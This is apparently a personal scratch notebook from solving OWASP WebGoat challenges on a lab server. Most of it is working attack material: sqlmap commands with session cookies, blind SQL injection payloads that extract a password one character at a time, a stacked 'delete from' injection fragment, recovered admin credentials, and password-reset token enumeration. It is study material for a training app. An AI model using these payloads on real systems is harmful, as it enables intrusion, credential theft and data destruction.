How to know which type of a file!?

How to get more information about a Webserver!?
    Any pentesting tool to a webserver!?
        metasploit!!
            https://www.youtube.com/watch?v=7K7kcLJ2sBI

nmap with multiple information about a host!?
    -T4 -A -v
    -O

Or Webwolf exploit!?
    9090!?
        From zeus webserver!!?

Can we exploit Bigmem!?
    https://www.exploit-db.com/exploits/40136

Create a new user!?
    Hint: https://cysecguide.blogspot.com/2019/05/webgoat-write-upcreating-new-account.html
    
    Try the supper tool sqlmap!!
        Cookie=JSESSIONID=2gt0c4RK6BnwSOn4K19HCwwF66y4pEKpTzh713vc

            http://www.xianxianlabs.com/2018/06/12/webgoat3/#Creating_a_new_account
                The database is HSQLDB!
                    Regex follow Java style!
                        http://tutorials.jenkov.com/java-regex/index.html#matching-any-of-a-set-of-characters
                    Function syntax!!
                        http://hsqldb.org/doc/guide/builtinfunctions-chapt.html#bfc_string_binary_functions

                sqlmap -r sqlmap-larry.txt --current-user --current-db
                sqlmap -r sqlmap-tom1.txt --current-user --current-db
                sqlmap -r sqlmap-tom1.txt --current-db
            
            sqlmap --url http://129.241.200.165:8080/WebGoat/challenge/6 --cookie='JSESSIONID=2gt0c4RK6BnwSOn4K19HCwwF66y4pEKpTzh713vc'
        sqlmap.py --url http://page.com/index.php?id=1 --cookie='PHPSESSIONID=ajksdgadhakjsdhak' --dbs
            From https://stackoverflow.com/questions/43439222/how-do-i-add-a-user-name-and-a-password-to-sqlmap
    
    Try SQL injection!!
        String checkUserQuery = "select userid from " + USERS_TABLE_NAME + " where userid = '" + username_reg + "'";
            We can try to guess the password value!!
                https://github.com/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)#sql-injection-advanced
                    tom' AND position("tom", password) !=0 AND '1' = '1
                        tom' AND position('tom', password) !=0 AND '1' = '1
                            tom' AND position('tom',password) !=0 AND '1' = '1
                            
                                tom' AND position('fortomonly' in password) !=0 AND '1' = '1
                                tom' AND position('tomonly' in password) !=0 AND '1' = '1
                                    True
                                tom' AND position('tom' in password) !=0 AND '1' = '1
                                    True
                    tom' AND length(password)=22 AND '1' = '1
                        tom' AND length(password)=23 AND '1' = '1
                            True
                        tom' AND length(password)>23 AND '1' = '1
                        tom' AND length(password)<23 AND '1' = '1
                    tom' AND password='thisisasecret
                    tom' AND password='thisisasecretfortomonly
                        tom' AND password='thisisasecretfortomonly
                            tom' AND password='thisisazecretfortomonly
                    
                    tom' AND regexp_matches(password, '[0-9]')'= true and '1' = '1
                        tom' AND regexp_matches(password, '([a-z_0-9])*')= true and '1' = '1
                            True
                            tom' AND regexp_matches(substring(password,8,6), '([0-9])*')= true and '1' = '1
                            tom' AND regexp_matches(substring(password,8,6), '([a-z_0-9])*')= true and '1' = '1
                                True
                                tom' AND regexp_matches(substring(password,8,6), '([abcdefghijklmnopqrstuvwxyz0123456789])*')= true and '1' = '1
                                    True
                                    tom' AND regexp_matches(substring(password,8,6), '([abcdefghijklmnopqrstuvwxyz012345678])*')= true and '1' = '1
                                        True
                                        tom' AND regexp_matches(substring(password,8,6), '([bcdefghijklmnopqrstuvwxyz01234567])*')= true and '1' = '1
                                            True
                                            tom' AND regexp_matches(substring(password,8,6), '([ceghijklmnopqrstuvwxyz0123456])*')= true and '1' = '1
                                                True
                                                tom' AND regexp_matches(substring(password,8,6), '([ceijklmnopqrstuvwxyz01234])*')= true and '1' = '1
                                                    True
                                                    tom' AND regexp_matches(substring(password,8,6), '([ceijklmnopqrstuvwxyz013])*')= true and '1' = '1
                                                        True
                                                        tom' AND regexp_matches(substring(password,8,6), '([ceijklmnopqrstuvwxyz3])*')= true and '1' = '1
                                                            True
                                                            tom' AND regexp_matches(substring(password,8,6), '([cepqrstuvwxyz3])*')= true and '1' = '1
                                                                True
                                                                tom' AND regexp_matches(substring(password,8,6), '([cerstuvwxyz3])*')= true and '1' = '1
                                                                    True
                                                                    tom' AND regexp_matches(substring(password,8,6), '([cerstuvwz3])*')= true and '1' = '1
                                                                        True
                                                                        tom' AND regexp_matches(substring(password,8,6), '([cerstz3])*')= true and '1' = '1
                                                                            True
                                                                            tom' AND regexp_matches(substring(password,8,6), '([certz3])*')= true and '1' = '1
                                                                                True
                                                                                tom' AND position('zecret' in password) !=0 AND '1' = '1
                                                                                    True

                                                                                tom' AND position('zecr3t' in password) !=0 AND '1' = '1
                                                                                tom' AND position('z3cret' in password) !=0 AND '1' = '1
                                                                            tom' AND regexp_matches(substring(password,8,6), '([crstz3])*')= true and '1' = '1
                                                                    tom' AND regexp_matches(substring(password,8,6), '([cerstuvwx3])*')= true and '1' = '1
                                                                tom' AND regexp_matches(substring(password,8,6), '([cepqstuvx3])*')= true and '1' = '1
                                                                tom' AND regexp_matches(substring(password,8,6), '([cestuvxyz3])*')= true and '1' = '1
                                                        tom' AND regexp_matches(substring(password,8,6), '([ceijklmnopqrstux013])*')= true and '1' = '1
                                                        tom' AND regexp_matches(substring(password,8,6), '([ceijklmnopqrstu013])*')= true and '1' = '1
                                            tom' AND regexp_matches(substring(password,8,6), '([cfghijklmnopqrstuvwxyz0123456])*')= true and '1' = '1
                                            tom' AND regexp_matches(substring(password,8,6), '([efghijklmnopqrstuvwxyz0123456])*')= true and '1' = '1
                        tom' AND regexp_matches(password, '([a-z_0-9])+')= true and '1' = '1
                        tom' AND regexp_matches(password, '([a-z]|[0-9])+')= true and '1' = '1
                        tom' AND regexp_matches(password, '[a-zA-Z]+')= true and '1' = '1
                        tom' AND regexp_matches(password, '[a-z]+')= true and '1' = '1
                        tom' AND regexp_matches(password, '[a-z]')= true and '1' = '1
                        tom' AND regexp_matches(password, '[0-9]')= false and '1' = '1
                        tom' AND regexp_matches(password, '[0-9]')= true and '1' = '1

                    tom' AND substring(password,5,2)='is
                        True
                        tom' AND substring(password,7,1)='a
                            true
                        tom' AND substring(password,7,2)='as
                            tom' AND substring(lcase(password),8,1)='t
                                tom' AND substring(lcase(password),8,1)='e
                            tom' AND substring(password,8,1)='t
                                tom' AND substring(password,13,1)='t
                                    True
                                        tom' AND substring(password,12,1)='e
                                            True
                                            tom' AND substring(password,11,1)='r
                                                True
                                                tom' AND substring(password,10,1)='c
                                                    True
                                                    tom' AND substring(password,9,1)='e
                                                    tom' AND substring(password,9,1)='3
                                                tom' AND substring(password,10,1)='3
                                        tom' AND substring(password,12,1)='3
                                tom' AND substring(password,14,1)='t
                            tom' AND substring(password,8,1)='f
                            tom' AND substring(password,8,1)='z
                                True
                            tom' AND substring(password,8,1)='b
                            tom' AND substring(password,8,1)='a
                            tom' AND substring(password,8,1)='S
                        tom' AND substring(password,7,3)='ase
                        tom' AND substring(password,6,4)='asec

                    tom' AND substring(password,4,1)='s
                        True

                    tom' AND substring(password,3,1)='i
                        True
                    tom' AND substring(password,2,1)='i
                        created
                    tom' AND substring(password,2,1)='h
                        True
                    tom' AND substring(password,1,1)='t
                        True
                        From position and string length
            
            How to have condition return false but a new row tom inserted into table!?
            How to have tom in the username_reg but the condition return false!?

            tom1' and '1' != '1
            tom1' or '1' = '1
            tom1'; delete from 
    
    Challenge 6!
        https://github.com/WebGoat/WebGoat/tree/686d8b0c854a9a4ec6f73444eda98961618d1d18/webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge6

Admin Lost password!!
    Hint: https://cysecguide.blogspot.com/2019/05/webgoat-write-upadmin-lost-password.html
    Download the image and extract the text with Text Editor!!
        Flag!!
            f9b0fcea-29a7-48e2-997e-8e20b4c751da
        Found some more!!
            admin:##taogbew_nimda_4321##
        
        Get text only!
            webgoat_admin_1234
                webgoat_admin

        Decode base64!
            !!webgoat_admin_1234!!
                !webgoat_admin_1234!

        wg root login: ISF3ZWJnb2F0X2FkbWluXzEyMzQhIQ==
        
    Challenge !
        https://github.com/WebGoat/WebGoat/tree/686d8b0c854a9a4ec6f73444eda98961618d1d18/webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge1

Admin Password reset!!
    Hint: https://cysecguide.blogspot.com/2019/05/webgoat-write-upadmin-password-reset.html
    Continue using Burpsuite!!

    We are able to send email to the webwolf email account!!

    Try with Java code!!
        rm *.class ; javac Main4.java ; java Main4
        rm *.class ; javac Main3.java ; java Main3

   Generation password reset link for admin

Longest token!!
    7ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce333333333333333333333333355334343434344545454534624564564563456345634563456347546t56745674567456745656785678567856785678567856785678567856785678567856785678567856856875678567856786785678567856785678567856785678568756785678567856785678567856785678567856785678567856666666666666666666666666666666666666666666666666666666688888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999997777890766468666666

http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/7ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a74103457ce7a4802229f185a3a3fa29a7410345
Length = 0
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/7ce7a4802229f185a3a3fa29a7410345
<!-- http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/9d150a01b30aced89acdcb68e91c44c5 -->
Length = 1
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/27492a3ae5f2391a4028a150a7c7f348
Length = 2
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/f0a5c2428457e141822a733f9093aa7a
Length = 3
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/37a0f7228431a0e571435a49f2aac829
Length = 4
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a420a8a7915fa7c0e12323f459374a82
Length = 5
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/71473538805222faaaf941a2073ae94c
Length = 6
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a081235eff82092a319374c24aaa7574
Length = 7
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a4a537ea24a12f1093252a083f7c7894
Length = 8
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/1042aa7af88449ef257713a235a230c9
Length = 9
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/15028a0847a373c214e279529a4aaff3
Length = 10
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a1a723a2540429f91734a838c5e02fa7
Length = 11
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/2c3a492254a0f315e104a77a2a3898f7
Length = 12
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2
Length = 13
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a98c2754741a4faf32a5180e7392032a
Length = 14
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/af85037419254a74ea3a87f22a21c903
Length = 15
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/2073af4378a2aa52420e599a81f3c714
Length = 16
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/42ca1e3425a09f3a57f8278a102473a9
Length = 17
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/91fe3024cf85793a50aa71a3284a7242
Length = 18
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a42eaa7a8752f43f93314c71908a0225
Length = 19
http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/47170c92a0522a3583f9f42184aa7ea3

    Tool for Java Online compiler!!
        https://www.onlinegdb.com/online_java_compiler

    Source code!!
        The PasswordResetLink generate token based on the key.length, not the key!!
            https://raw.githubusercontent.com/WebGoat/WebGoat/686d8b0c854a9a4ec6f73444eda98961618d1d18/webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java

    Java decompiler online!!
        http://www.javadecompilers.com/result

    http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/375afe1104f4a487a73823c50a9292a2
    http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/a081235eff82092a319374c24aaa7574

Generation password reset link for admin
Created password reset link: a081235eff82092a319374c24aaa7574


        https://github.com/WebGoat/WebGoat/blob/686d8b0c854a9a4ec6f73444eda98961618d1d18/webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/Assignment7.java
            Method reset-password!!
                Need to have the correct ADMIN_PASSWORD_LINK!?
                    The token is created from PasswordResetLink.createPasswordReset(username, "webgoat")?
                    This value 375afe1104f4a487a73823c50a9292a2 is not correct!?
                    https://github.com/WebGoat/WebGoat/blob/686d8b0c854a9a4ec6f73444eda98961618d1d18/webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/SolutionConstants.java

    Try to send email=admin&token=admin!!

POST /WebGoat/challenge/7 HTTP/1.1
Host: 129.241.200.165:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://129.241.200.165:8080/WebGoat/start.mvc
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Cookie: JSESSIONID=mhISk2qm-lo4Bc5FYVyiWNFeFZaCYyZf4eLVkLAz
Connection: close

email=admin&token=admin

    Got server error!!

HTTP/1.1 500 Internal Server Error
Connection: close
Content-Type: application/json;charset=UTF-8
Date: Thu, 17 Oct 2019 08:53:34 GMT

{
  "timestamp" : "2019-10-17T08:53:34.985+0000",
  "status" : 500,
  "error" : "Internal Server Error",
  "message" : "Request processing failed; nested exception is java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 5",
  "trace" : "java.lang.StringIndexOutOfBoundsException: begin 0, end -1, length 5\n\tat java.base/java.lang.String.checkBoundsBeginEnd(String.java:3319)\n\tat java.base/java.lang.String.substring(String.java:1874)\n\tat org.owasp.webgoat.challenges.challenge7.Assignment7.sendPasswordResetLink(Assignment7.java:62)\n\tat jdk.internal.reflect.GeneratedMethodAccessor216.invoke(Unknown Source)\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.base/java.lang.reflect.Method.invoke(Method.java:566)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138)\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:892)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797)\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039)\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942)\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005)\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:665)\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:750)\n\tat io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129)\n\tat org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:88)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320)\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127)\n\tat org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:200)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:74)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334)\n\tat org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215)\n\tat org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178)\n\tat org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:357)\n\tat org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:270)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:114)\n\tat org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:104)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61)\n\tat io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131)\n\tat 